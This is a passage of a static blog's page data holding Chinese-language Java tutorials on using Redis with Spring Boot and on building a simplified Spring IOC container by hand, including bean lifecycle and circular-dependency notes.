jediscluster.get("cluster-test");\n\t\tsystem.out.println(string);\n\t\t//系统关闭前关闭jediscluster\n\t\tjediscluster.close();\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n\n\n\n# 详细 在springboot中使用redis\n\n 1. 在springboot中添加redis依赖：\n\n\x3c!--redis依赖配置--\x3e\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-starter-data-redis</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n 2. 在springboot中配置application-dev.yml\n\n  redis:\n    host: localhost # redis服务器地址\n    database: 0 # redis数据库索引（默认为0）\n    port: 6379 # redis服务器连接端口\n    password: # redis服务器连接密码（默认为空）\n    jedis:\n      pool:\n        max-active: 8 # 连接池最大连接数（使用负值表示没有限制）\n        max-wait: -1ms # 连接池最大阻塞等待时间（使用负值表示没有限制）\n        max-idle: 8 # 连接池中的最大空闲连接\n        min-idle: 0 # 连接池中的最小空闲连接\n    timeout: 3000ms # 连接超时时间（毫秒）\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n 3. 常用的redis操作\n\n> 通过springboot自动配置的stringredistemplate对象进行redis的读写操作\n\npackage com.macro.mall.portal.service.impl;\n\nimport com.macro.mall.portal.service.redisservice;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.data.redis.core.stringredistemplate;\nimport org.springframework.stereotype.service;\n\nimport java.util.concurrent.timeunit;\n\n/**\n * redis操作service的实现类\n */\n@service\npublic class redisserviceimpl implements redisservice {\n    @autowired\n    private stringredistemplate stringredistemplate;\n\n    @override\n    public void set(string key, string value) {\n        stringredistemplate.opsforvalue().set(key, value);\n    }\n\n    @override\n    public string get(string key) {\n        return stringredistemplate.opsforvalue().get(key);\n    }\n\n    @override\n    public boolean expire(string key, long expire) {\n        return stringredistemplate.expire(key, expire, timeunit.seconds);\n    }\n\n    @override\n    public void remove(string key) {\n        stringredistemplate.delete(key);\n    }\n\n    @override\n    public long increment(string key, long delta) {\n        return stringredistemplate.opsforvalue().increment(key,delta);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n 4. redis的其他操作\n\n> 注意：使用redis存储对象的时候，一定要将对象序列化（实现serializable接口或自己写序列化工具类）\n> \n> 其他操作（集合、hash等）详见：https://www.jianshu.com/p/56999f2b8e3b\n\n\n# redis缓存与数据库同步\n\n * 新增：数据库新增后，放到缓存中\n\n * 删除：删除数据库相应数据后删除缓存（或延时双删）\n\n * 查询：\n\n\n\n * 更新：一般是先跟新数据库，再删除缓存（或延时双删）\n\n',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"Spring IOC 底层实现原理介绍，手动实现 IOC 容器",frontmatter:{title:"Spring IOC 底层实现原理介绍，手动实现 IOC 容器",date:"2022-03-23T00:00:00.000Z",tags:["源码分析","Java"],categories:["后端 Back-end"],isShowComments:!1},regularPath:"/views/backend/spring-mini-ioc.html",relativePath:"views/backend/spring-mini-ioc.md",key:"v-2fef1074",path:"/views/backend/spring-mini-ioc.html",headers:[{level:3,title:"需要实现的IOC功能",slug:"需要实现的ioc功能",normalizedTitle:"需要实现的ioc功能",charIndex:103},{level:3,title:"实现简易IOC设计的类",slug:"实现简易ioc设计的类",normalizedTitle:"实现简易ioc设计的类",charIndex:117},{level:3,title:"类之间关系模型",slug:"类之间关系模型",normalizedTitle:"类之间关系模型",charIndex:132},{level:4,title:"前期准备",slug:"前期准备",normalizedTitle:"前期准备",charIndex:693},{level:2,title:"mini-IOC容器-定义类",slug:"mini-ioc容器-定义类",normalizedTitle:"mini-ioc容器-定义类",charIndex:3291},{level:2,title:"mini-IOC容器--解析注册",slug:"mini-ioc容器-解析注册",normalizedTitle:"mini-ioc容器--解析注册",charIndex:7191},{level:2,title:"mini-IOC容器-getBean",slug:"mini-ioc容器-getbean",normalizedTitle:"mini-ioc容器-getbean",charIndex:10612},{level:2,title:"mini-IOC容器-单例对象初始化",slug:"mini-ioc容器-单例对象初始化",normalizedTitle:"mini-ioc容器-单例对象初始化",charIndex:15785},{level:2,title:"mini-IOC容器-测试和小结",slug:"mini-ioc容器-测试和小结",normalizedTitle:"mini-ioc容器-测试和小结",charIndex:16396},{level:2,title:"IOC容器源码及其它面试细节",slug:"ioc容器源码及其它面试细节",normalizedTitle:"ioc容器源码及其它面试细节",charIndex:16740},{level:3,title:"扩展: 容器如何创建对象",slug:"扩展-容器如何创建对象",normalizedTitle:"扩展: 容器如何创建对象",charIndex:16759},{level:3,title:"扩展: bean的生命周期",slug:"扩展-bean的生命周期",normalizedTitle:"扩展: bean的生命周期",charIndex:16917},{level:3,title:"扩展: bean的循环依赖问题",slug:"扩展-bean的循环依赖问题",normalizedTitle:"扩展: bean的循环依赖问题",charIndex:17475},{level:3,title:"扩展: bean的覆盖问题",slug:"扩展-bean的覆盖问题",normalizedTitle:"扩展: bean的覆盖问题",charIndex:18682}],excerpt:"<Boxx/>\n<p>Spring源码晦涩难懂怎么办呢? 自己手动实现一个mini ioc容器吧，实现后再回头看Spring源码事半功倍哦，就算直接和面试官讲也完全可以哦，类名完全按照源码设计，话不多说直接开干~!</p>\n",headersStr:"需要实现的IOC功能 实现简易IOC设计的类 类之间关系模型 前期准备 mini-IOC容器-定义类 mini-IOC容器--解析注册 mini-IOC容器-getBean mini-IOC容器-单例对象初始化 mini-IOC容器-测试和小结 IOC容器源码及其它面试细节 扩展: 容器如何创建对象 扩展: bean的生命周期 扩展: bean的循环依赖问题 扩展: bean的覆盖问题",content:'Spring源码晦涩难懂怎么办呢? 自己手动实现一个mini ioc容器吧，实现后再回头看Spring源码事半功倍哦，就算直接和面试官讲也完全可以哦，类名完全按照源码设计，话不多说直接开干~!\n\n\n\n * 需要实现的IOC功能\n * 实现简易IOC设计的类\n * 类之间关系模型\n\n\n\n\n# 需要实现的IOC功能\n\n * 可以通过xml配置bean信息\n * 可以通过容器getBean获取对象\n * 能够根据Bean的依赖属性实现依赖注入\n * 可以配置Bean的单例多例\n\n\n# 实现简易IOC设计的类\n\n类/接口                         说明\nBeanFactory                  IOC容器的基础接口，提供IOC容器的基本功能\nDefaultListableBeanFactory   IOC容器的核心实现类，提供多个map集合用来存储bean的定义对象，提供getBean方法的核心实现\nXmlBeanFactory               IOC容器的实现类，基于xml构建bean信息\nXmlBeanDefinitionReader      用于解析xml信息，并提供解析Document文档的方法，并将解析到的BeanDefinition对象注册到核心容器中\nBeanDefinition               封装Bean的定义对象，如: bean的id class,scope ..等等\nProperty                     封装Bean所关联依赖的属性\n\n\n# 类之间关系模型\n\n\n\n# 前期准备\n\n创建maven项目引入依赖\n\n<dependencies>\n    \x3c!-- 解析xml --\x3e\n    <dependency>\n        <groupId>dom4j</groupId>\n        <artifactId>dom4j</artifactId>\n        <version>1.1</version>\n    </dependency>\n    \x3c!-- BeanUtils    --\x3e\n    <dependency>\n        <groupId>commons-beanutils</groupId>\n        <artifactId>commons-beanutils</artifactId>\n        <version>1.9.3</version>\n    </dependency>\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n准备3个bean的实体类\n\n/**\n * 学生类  \n * 学生类依赖班级对象\n * 并提供 sayHello() 方法\n **/\npublic class Student {\n    private String name;\n    private TClass tClass;\n    public void sayHello(){\n        System.out.println("大家好,我是" +this.name+" 我的班级是==>"+tClass.getCname() + " 我的老师是"+tClass.getTeacher().getTname());\n    }\n    public String getName() {\n        return name;\n    }\n    public void setName(String name) {\n        this.name = name;\n    }\n    public TClass gettClass() {\n        return tClass;\n    }\n    public void settClass(TClass tClass) {\n        this.tClass = tClass;\n    }\n}\n/**\n * 班级类\n * 班级类依赖教师对象\n **/\npublic class TClass {\n    private String cname;// 班级名称\n    private Teacher teacher; // 老师\n    public String getCname() {\n        return cname;\n    }\n    public void setCname(String cname) {\n        this.cname = cname;\n    }\n    public com.itcast.ioc.bean.Teacher getTeacher() {\n        return teacher;\n    }\n    public void setTeacher(com.itcast.ioc.bean.Teacher teacher) {\n        this.teacher = teacher;\n    }\n}\n/**\n * 教师类\n **/\npublic class Teacher {\n    private String tname;// 老师名称\n    public String getTname() {\n        return tname;\n    }\n    public void setTname(String tname) {\n        this.tname = tname;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n\n\nxml配置对象\n\n配置学生对象: 小明\n\n依赖班级对象: 3年2班\n\n依赖教师对象: 陈老师\n\n<?xml version="1.0" encoding="UTF-8"?>\n<beans>\n    \x3c!-- 配置IOC容器要管理的对象   bean作用域: 单例  原型 --\x3e\n    <bean id="student" class="com.itcast.ioc.bean.Student" scope="singleton"\n          lazy-init="true">\n        \x3c!-- 依赖注入:   属性注入    构造器注入   注解注入--\x3e\n        <property name="name" value="小明"></property>\n        <property name="tClass" ref="tclass"></property>\n    </bean>\n    <bean id="tclass" class="com.itcast.ioc.bean.TClass">\n        <property name="cname" value="3年2班"></property>\n        <property name="teacher" ref="teacher"></property>\n    </bean>\n    <bean id="teacher" class="com.itcast.ioc.bean.Teacher">\n        <property name="tname" value="陈老师"></property>\n    </bean>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# mini-IOC容器-定义类\n\n定义BeanFactory\n\n/**\n * 容器的基础接口\n * 提供容器最基本的功能\n */\npublic interface BeanFactory {\n    // 核心方法 获取对象\n    Object getBean(String beanName);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n定义DefaultListableBeanFactory\n\npackage com.itcast.ioc.core;\n\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\n\n/**\n * 基础容器的核心实现\n * 提供 beanDefinitionMap 存储bean的定义\n * 提供 singletonObjects 存储bean的对象实例\n **/\npublic class DefaultListableBeanFactory implements BeanFactory {\n    // 提供 beanDefinitionMap 存储bean的定义\n    private Map<String,BeanDefinition> beanDefinitionMap = new ConcurrentHashMap<>();\n    // 提供 singletonObjects 存储bean的对象实例 (scope为singleton的)\n    private Map<String,Object> singletonObjects = new ConcurrentHashMap<>();\n    /**\n     * 实现getBean方法\n     * @param beanName\n     * @return\n     */\n    @Override\n    public Object getBean(String beanName) {\n        return null;\n    }\n    /**\n     * 将bean注册到容器中\n     * @param beanDefinition\n     */\n    public void registerBeanDefinition(BeanDefinition beanDefinition){\n        beanDefinitionMap.put(beanDefinition.getBeanName(),beanDefinition);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n定义BeanDefnition\n\n/**\n * 用于描述Bean的定义\n **/\npublic class BeanDefinition {\n    private String beanName; // bean标签的ID 作为bean的唯一标识\n    private String className; // bean的所属class\n    private String scope = "singleton";  // bean的scope作用域\n    private List<Property> propertyList = new ArrayList<>();\n    public String getBeanName() {\n        return beanName;\n    }\n    public void setBeanName(String beanName) {\n        this.beanName = beanName;\n    }\n    public String getClassName() {\n        return className;\n    }\n    public void setClassName(String className) {\n        this.className = className;\n    }\n    public String getScope() {\n        return scope;\n    }\n    public void setScope(String scope) {\n        this.scope = scope;\n    }\n    public List<Property> getPropertyList() {\n        return propertyList;\n    }\n    public void setPropertyList(List<Property> propertyList) {\n        this.propertyList = propertyList;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n定义Property\n\n/**\n * 用于封装一个property标签\n * 属性数据\n **/\npublic class Property {\n    private String name; // 属性名称\n    private String value; // 属性的值\n    private String ref; // 属性的引用\n    public String getName() {\n        return name;\n    }\n    public void setName(String name) {\n        this.name = name;\n    }\n    public String getValue() {\n        return value;\n    }\n    public void setValue(String value) {\n        this.value = value;\n    }\n    public String getRef() {\n        return ref;\n    }\n    public void setRef(String ref) {\n        this.ref = ref;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n定义XmlBeanFactory\n\n/**\n * 继承核心实现类\n * 基于xml配置bean的实现类\n **/\npublic class XmlBeanFactory extends DefaultListableBeanFactory {\n    /**\n     * 将解析配置文件 注册bean的所有工作交给reader对象\n     */\n    final XmlBeanDefinitionReader xmlBeanDefinitionReader = new XmlBeanDefinitionReader(this);\n    /**\n     * 构造器需要传入xml配置文件\n     * @param configPath\n     */\n    public XmlBeanFactory(String configPath) {\n        // 使用reader对象 解析配置  注册Bean\n        this.xmlBeanDefinitionReader.loadBeanDefinitions(configPath);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n定义XmlBeanDefinitionReader\n\n/**\n * 解析配置\n * 注册到容器中\n **/\npublic class XmlBeanDefinitionReader {\n    // 核心beanfactory对象 用于将解析后的bean注册到beanfactory中\n    final DefaultListableBeanFactory beanFactory;\n    public XmlBeanDefinitionReader(DefaultListableBeanFactory beanFactory) {\n        this.beanFactory = beanFactory;\n    }\n    /**\n     * 根据传递的配置文件\n     * 解析配置\n     * 注册bean\n     * @param configPath\n     */\n    void loadBeanDefinitions(String configPath){\n\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# mini-IOC容器--解析注册\n\n实现步骤\n\n 1. 通过dom4j解析xml得到Document文档\n\n 2. 遍历文档所有Bean标签\n\n 3. 解析每一个Bean标签 封装一个BeanDefinition对象\n\n 4. 解析每一个Bean标签下的所有Property标签 封装一个Property对象\n\n 5. 将BeanDefinition和Property对象注册到容器\n\n实现xml解析及bean注册\n\n/**\n * 解析配置\n * 注册到容器中\n **/\npublic class XmlBeanDefinitionReader {\n    // 核心beanfactory对象 用于将解析后的bean注册到beanfactory中\n    final DefaultListableBeanFactory beanFactory;\n    public XmlBeanDefinitionReader(DefaultListableBeanFactory beanFactory) {\n        this.beanFactory = beanFactory;\n    }\n    /**\n     * 根据传递的配置文件\n     * 解析配置\n     * 注册bean\n     * @param configPath\n     */\n    void loadBeanDefinitions(String configPath){\n        // 1. 通过dom4j解析xml得到Document文档\n        Document document = doLoadDocument(configPath);\n        // 2. 遍历文档所有Bean标签\n        Element rootElement = document.getRootElement();\n        List<Element> list = rootElement.selectNodes("//bean");\n        for (Element element : list) {\n            // 3. 解析每一个Bean标签 封装一个BeanDefinition对象\n            BeanDefinition beanDefinition = parseBeanDefinition(element);\n            // 5. 将BeanDefinition和Property对象注册到容器\n            beanFactory.registerBeanDefinition(beanDefinition);\n        }\n    }\n    /**\n     * 3. 解析每一个Bean标签 封装一个BeanDefinition对象\n     * 4. 解析每一个Bean标签下的所有Property标签 封装一个Property对象\n     */\n    BeanDefinition parseBeanDefinition(Element element){\n        BeanDefinition beanDefinition = new BeanDefinition();\n        String beanName = element.attributeValue("id");\n        String className = element.attributeValue("class");\n        String scope = element.attributeValue("scope");\n        beanDefinition.setBeanName(beanName);\n        beanDefinition.setClassName(className);\n        if(scope!=null&&!"".equals(scope)){\n            beanDefinition.setScope(scope);\n        }\n        List<Element> propertyList = element.elements("property");\n        for (Element propertyEle : propertyList) {\n            Property property = new Property();\n            property.setName(propertyEle.attributeValue("name"));\n            property.setValue(propertyEle.attributeValue("value"));\n            property.setRef(propertyEle.attributeValue("ref"));\n            beanDefinition.getPropertyList().add(property);\n        }\n        return beanDefinition;\n    }\n    /**\n     * 解析Document文档\n     * @param configPath\n     * @return\n     */\n    Document doLoadDocument(String configPath){\n        InputStream inputStream = this.getClass().getClassLoader().getResourceAsStream(configPath);\n        SAXReader saxReader = new SAXReader();\n        try {\n            return saxReader.read(inputStream);\n        } catch (DocumentException e) {\n            e.printStackTrace();\n            System.out.println("解析xml出现异常==>"+e.getMessage());\n            throw new RuntimeException(e.getMessage());\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n\n\n准备测试类\n\n/**\n * 测试类\n **/\npublic class IocTest {\n    public static void main(String[] args) {\n        // 创建IOC容器\n        BeanFactory beanFactory = new XmlBeanFactory("applicationContext.xml");\n        // 通过容器获取对象\n        Student student = (Student)beanFactory.getBean("student");\n        // 调用对象sayHello方法\n        student.sayHello();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n断点查看注册情况\n\n可以看到我们配置的xml内容 已经解析成了BeanDefinition对象，注册到了核心容器的map中\n\n\n\n\n# mini-IOC容器-getBean\n\n实现步骤\n\n 1. 先从单例的map集合中获取 是否有指定beanName的对象\n\n·有直接返回\n\n·没有下一步\n\n 2. 从注册集合中获取bean的定义对象\n\n·有下一步\n\n·没有抛异常NoSuchBeanDefinition\n\n 3. 判断bean的scope作用域\n\nsingleton单例\n\n· createBean对象\n\n·存入单例集合\n\n·返回对象\n\nprototype多例\n\n·createBean对象\n\n·返回对象\n\n 4. createBean方法\n\n获取BeanDefinition中的className\n\n通过反射API得到Class对象\n\n通过反射API得到bean实例\n\n获取BeanDefinition中依赖的属性列表\n\n实现属性的依赖注入\n\n实现getBean及createBean方法\n\n/**\n * 基础容器的核心实现\n * 提供 beanDefinitionMap 存储bean的定义\n * 提供 singletonObjects 存储bean的对象实例\n **/\npublic class DefaultListableBeanFactory implements BeanFactory {\n    // 提供 beanDefinitionMap 存储bean的定义\n    private Map<String,BeanDefinition> beanDefinitionMap = new ConcurrentHashMap<>();\n    // 提供 singletonObjects 存储bean的对象实例 (scope为singleton的)\n    private Map<String,Object> singletonObjects = new ConcurrentHashMap<>();\n    /**\n     * 实现getBean方法\n     * @param beanName\n     * @return\n     */\n    @Override\n    public Object getBean(String beanName) {\n//        1. 先从单例的map集合中获取 是否有指定beanName的对象\n        Object singletonObj = singletonObjects.get(beanName);\n//                有直接返回\n        if(singletonObj!=null){\n            return singletonObj;\n        }\n//                没有下一步\n//        2. 从注册集合中获取bean的定义对象\n        BeanDefinition beanDefinition = beanDefinitionMap.get(beanName);\n//                有下一步\n//        没有抛异常NoSuchBeanDefinition\n        if(beanDefinition==null){\n            throw new RuntimeException("NoSuchBeanDefinition : 你找的 "+beanName+" 对象 不存在");\n        }\n//        3. 判断bean的scope作用域\n        String scope = beanDefinition.getScope();\n//                singleton单例\n        if("singleton".equals(scope)){\n//        createBean对象\n            Object obj = createBean(beanDefinition);\n//        存入单例集合\n            singletonObjects.put(beanName,obj);\n//        返回对象\n            return obj;\n        }else {\n//        prototype多例\n//        createBean对象\n            return createBean(beanDefinition);\n//        返回对象\n        }\n    }\n    /**\n     * //4. createBean方法\n     * //获取BeanDefinition中的className\n     * //通过反射API得到Class对象\n     * //通过反射API得到bean实例\n     * //获取BeanDefinition中依赖的属性列表\n     * //实现属性的依赖注入\n     * 创建对象\n     * @param beanDefinition\n     * @return\n     */\n    Object createBean(BeanDefinition beanDefinition){\n        String className = beanDefinition.getClassName();\n        Class<?> aClass;\n        try {\n            aClass = Class.forName(className);\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n            throw new RuntimeException("类未找到"+e.getMessage());\n        }\n        // 创建对象:\n        Object obj;\n        try {\n            obj = aClass.newInstance();\n        } catch (InstantiationException e) {\n            e.printStackTrace();\n            throw new RuntimeException("创建对象失败"+e.getMessage());\n        } catch (IllegalAccessException e) {\n            e.printStackTrace();\n            throw new RuntimeException("非法访问"+e.getMessage());\n        }\n        // 依赖注入\n        List<Property> propertyList = beanDefinition.getPropertyList();\n        for (Property property : propertyList) {\n            String name = property.getName();\n            String value = property.getValue();\n            String ref = property.getRef();\n            // 属性名不为空 进行注入\n            if(name!=null&&!"".equals(name)){\n                // 如果配置的是value值 直接注入\n                if(value!=null&&!"".equals(value)){\n                    Map<String,String> params = new HashMap<>();\n                    params.put(name,value);\n                    try {\n                        BeanUtils.populate(obj,params);\n                    } catch (IllegalAccessException e) {\n                        e.printStackTrace();\n                        throw new RuntimeException("非法访问"+e.getMessage());\n                    } catch (InvocationTargetException e) {\n                        e.printStackTrace();\n                        throw new RuntimeException("调用目标对象失败"+e.getMessage());\n                    }\n                }\n                // 如果配置的是ref需要获取其它对象注入\n                if(ref!=null&&!"".equals(ref)){\n                    try {\n                        BeanUtils.setProperty(obj,name,getBean(ref));\n                    } catch (IllegalAccessException e) {\n                        e.printStackTrace();\n                        throw new RuntimeException("非法访问"+e.getMessage());\n                    } catch (InvocationTargetException e) {\n                        e.printStackTrace();\n                        throw new RuntimeException("调用目标对象失败"+e.getMessage());\n                    }\n                }\n            }\n        }\n        return obj;\n    }\n    /**\n     * 将bean注册到容器中\n     * @param beanDefinition\n     */\n    public void registerBeanDefinition(BeanDefinition beanDefinition){\n        beanDefinitionMap.put(beanDefinition.getBeanName(),beanDefinition);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n\n\n\n# mini-IOC容器-单例对象初始化\n\nDefaultListableBeanFactory增加初始化方法\n\npublic void preInstaniceSingletons(){\n        beanDefinitionMap.forEach((beanName,beanDefinition)->{\n            String scope = beanDefinition.getScope();\n            // 判断单例  非抽象   不懒加载\n            if("singleton".equals(scope)){\n                this.getBean(beanName);\n            }\n        });\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nXmlBeanFactory增加单例对象初始化\n\npublic XmlBeanFactory(String configPath) {\n   // 使用reader对象 解析配置  注册Bean\n   this.xmlBeanDefinitionReader.loadBeanDefinitions(configPath);\n   // 初始化单例对象\n   this.preInstaniceSingletons();\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# mini-IOC容器-测试和小结\n\n测试对象能否获取\n\npublic class IocTest {\n    public static void main(Stiring[] args) {\n        BeanFactory beanFactory = new XmlBeanFactory("applicationContext.xml");\n        Student student = (Student) beanFactory.getBean("student");\n        student.sayHello();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n查看bean的注册及单例集合信息\n\n可以通过变更scope的值查看对应的变化\n\n\n\n\n# IOC容器源码及其它面试细节\n\n\n# 扩展: 容器如何创建对象\n\nIOC容器在准备创建对象时， 会判断是否有配置 factory-method方法\n\n如果有配置 会调用factory-method所指向的方法构建对象.\n\n如果没配置，会检查是否有配置构造参数\n\n无构造参数: 调用默认构造器创建对象\n\n有构造参数: 根据参数情况匹配对应的构造器\n\n\n# 扩展: bean的生命周期\n\nspring 容器中的bean的完整生命周期一共分为十一步完成。\n\n1.bean对象的实例化\n\n2.封装属性，也就是设置properties中的属性值\n\n3.如果bean实现了BeanNameAware，则执行setBeanName方法,也就是bean中的id值\n\n4.如果实现BeanFactoryAware或者ApplicationContextAware ，需要设置setBeanFactory或者上下文对象setApplicationContext\n\n5.如果存在类实现BeanPostProcessor后处理bean，执行postProcessBeforeInitialization，可以在初始化之前执行一些方法\n\n6.如果bean实现了InitializingBean，则执行afterPropertiesSet，执行属性设置之后的操作\n\n7.调用执行指定的初始化方法\n\n8.如果存在类实现BeanPostProcessor则执行postProcessAfterInitialization，执行初始化之后的操作\n\n9.执行自身的业务方法\n\n10.如果bean实现了DisposableBean，则执行spring的的销毁方法\n\n11.调用执行自定义的销毁方法。\n\n\n# 扩展: bean的循环依赖问题\n\nA 依赖 B B 依赖 A 产生闭环，称为循环依赖\n\n·Spring 默认允许单例对象的属性注入 所产生的循环依赖\n\n单例对象的循环依赖 Spring通过3级缓存来解决\n\n比如一个类A中有一个属性是B类，B类中有一个属性是A类，这时看Spring是怎么解决他们的相互依赖的。Spring注入一个类的大体步骤分为两部分，一是先完成对类的构造工作，二是会对类的属性进行设置和填充。首先Spring构造A类，通过AbstractAutowireCapableBeanFactory的doCreateBean方法中调用addSingletonFactory方法将A类曝光到singletonFactories中。这时完成A的构造后，需要填充B属性，继续第二步，发现B还没有构造，于是开始B流程的构造过程，构造的时候发现需要填充A，从第三层缓存singletonFactories中找到A(此时的A还没有完全构造完成，但是可以拿到A的一个引用)，B拿到A的引用后，完成B自己的填充属性工作，完成初始化工作，把自己放到第一层缓存singletonObjects中。这时回到A的这边，在拿到B对象后，完成自己的填充属性工作。\n\n源码                      级别     描述\nsingletonObjects        一级缓存   用于存放完全初始化好的 bean，从该缓存中取出的 bean 可以直接使用\nearlySingletonObjects   二级缓存   存放原始的 bean 对象（尚未填充属性），用于解决循环依赖\nsingletonFactories      三级缓存   存放 bean 工厂对象，用于解决循环依赖·如果是构造器依赖属性 会报循环依赖异常\n\n·如果对象都是多例对象 会报循环依赖异常\n\n·如果设置allowCircularReferences为false 会报循环依赖异常\n\nprotected void customizeBeanFactory(DefaultListableBeanFactory beanFactory) {\n   if (this.allowBeanDefinitionOverriding != null) {\n      beanFactory.setAllowBeanDefinitionOverriding(this.allowBeanDefinitionOverriding);\n   }\n   if (this.allowCircularReferences != null) {\n      beanFactory.setAllowCircularReferences(this.allowCircularReferences);\n   }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 扩展: bean的覆盖问题\n\n默认情况:\n\n同一个配置文件中出现id相同的bean会报错，不同的配置文件出现id相同的bean后加，载的bean会将先加载的bean覆盖掉称为bean的覆盖，bean的覆盖不会报错，但可能影响我们的项目，可以通过属性设置不允许bean的覆盖，allowBeanDefinitionOverriding设置为false。',normalizedContent:'spring源码晦涩难懂怎么办呢? 自己手动实现一个mini ioc容器吧，实现后再回头看spring源码事半功倍哦，就算直接和面试官讲也完全可以哦，类名完全按照源码设计，话不多说直接开干~!\n\n\n\n * 需要实现的ioc功能\n * 实现简易ioc设计的类\n * 类之间关系模型\n\n\n\n\n# 需要实现的ioc功能\n\n * 可以通过xml配置bean信息\n * 可以通过容器getbean获取对象\n * 能够根据bean的依赖属性实现依赖注入\n * 可以配置bean的单例多例\n\n\n# 实现简易ioc设计的类\n\n类/接口                         说明\nbeanfactory                  ioc容器的基础接口，提供ioc容器的基本功能\ndefaultlistablebeanfactory   ioc容器的核心实现类，提供多个map集合用来存储bean的定义对象，提供getbean方法的核心实现\nxmlbeanfactory               ioc容器的实现类，基于xml构建bean信息\nxmlbeandefinitionreader      用于解析xml信息，并提供解析document文档的方法，并将解析到的beandefinition对象注册到核心容器中\nbeandefinition               封装bean的定义对象，如: bean的id class,scope ..等等\nproperty                     封装bean所关联依赖的属性\n\n\n# 类之间关系模型\n\n\n\n# 前期准备\n\n创建maven项目引入依赖\n\n<dependencies>\n    \x3c!-- 解析xml --\x3e\n    <dependency>\n        <groupid>dom4j</groupid>\n        <artifactid>dom4j</artifactid>\n        <version>1.1</version>\n    </dependency>\n    \x3c!-- beanutils    --\x3e\n    <dependency>\n        <groupid>commons-beanutils</groupid>\n        <artifactid>commons-beanutils</artifactid>\n        <version>1.9.3</version>\n    </dependency>\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n准备3个bean的实体类\n\n/**\n * 学生类  \n * 学生类依赖班级对象\n * 并提供 sayhello() 方法\n **/\npublic class student {\n    private string name;\n    private tclass tclass;\n    public void sayhello(){\n        system.out.println("大家好,我是" +this.name+" 我的班级是==>"+tclass.getcname() + " 我的老师是"+tclass.getteacher().gettname());\n    }\n    public string getname() {\n        return name;\n    }\n    public void setname(string name) {\n        this.name = name;\n    }\n    public tclass gettclass() {\n        return tclass;\n    }\n    public void settclass(tclass tclass) {\n        this.tclass = tclass;\n    }\n}\n/**\n * 班级类\n * 班级类依赖教师对象\n **/\npublic class tclass {\n    private string cname;// 班级名称\n    private teacher teacher; // 老师\n    public string getcname() {\n        return cname;\n    }\n    public void setcname(string cname) {\n        this.cname = cname;\n    }\n    public 